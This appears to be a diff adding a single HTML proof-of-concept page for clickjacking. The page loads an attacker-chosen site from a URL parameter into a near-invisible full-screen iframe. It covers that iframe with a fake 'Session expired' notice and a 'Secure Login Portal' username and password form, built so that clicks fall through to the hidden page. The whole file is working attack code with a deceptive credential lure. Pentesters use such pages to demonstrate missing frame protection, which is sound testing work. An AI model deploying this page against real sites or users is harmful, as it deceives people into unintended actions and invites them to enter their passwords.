@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking Login PoC</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: monospace;
+      background: #000;
+      color: #0f0;
+      overflow: hidden;
+    }
+
+    .notification {
+      position: absolute;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #111;
+      padding: 15px 30px;
+      border: 2px solid #0f0;
+      box-shadow: 0 0 10px #0f0;
+      z-index: 3;
+      font-size: 18px;
+      text-align: center;
+    }
+
+    .overlay {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 600px;
+      max-width: 90%;
+      background: #111;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 20px;
+      z-index: 3;
+      border: 4px dashed #0f0;
+      box-shadow: 0 0 20px lime;
+    }
+
+    .overlay h1 {
+      font-size: 26px;
+      margin-bottom: 20px;
+      text-shadow: 0 0 4px #0f0;
+    }
+
+    .overlay input {
+      padding: 10px;
+      margin: 10px;
+      width: 300px;
+      font-size: 16px;
+      background: #000;
+      border: 2px solid #0f0;
+      color: #0f0;
+      outline: none;
+      text-align: center;
+    }
+
+    .overlay button {
+      padding: 10px 20px;
+      font-size: 18px;
+      color: #000;
+      background: #0f0;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 0 8px #0f0;
+      margin-top: 20px;
+    }
+
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      opacity: 0.1;
+      z-index: 2;
+      border: none;
+      pointer-events: auto;
+    }
+
+    .overlay, .notification {
+      pointer-events: none; /* Allow iframe clicks to pass through */
+    }
+
+    .overlay input,
+    .overlay button {
+      pointer-events: auto; /* Allow user to interact with inputs */
+    }
+  </style>
+</head>
+<body>
+
+  <div class="notification">Session expired. Please login again.</div>
+
+  <div class="overlay">
+    <h1>Secure Login Portal</h1>
+    <input type="text" placeholder="Username">
+    <input type="password" placeholder="Password">
+    <button>Login</button>
+  </div>
+
+  <iframe id="jack-frame"></iframe>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const target = params.get("target");
+    if (target) {
+      try {
+        const decoded = decodeURIComponent(target);
+        document.getElementById("jack-frame").src = decoded;
+        console.log("Iframe loaded:", decoded);
+      } catch (e) {
+        console.warn("Failed to decode target URL:", target);
+      }
+    }
+  </script>
+
+</body>
+</html>
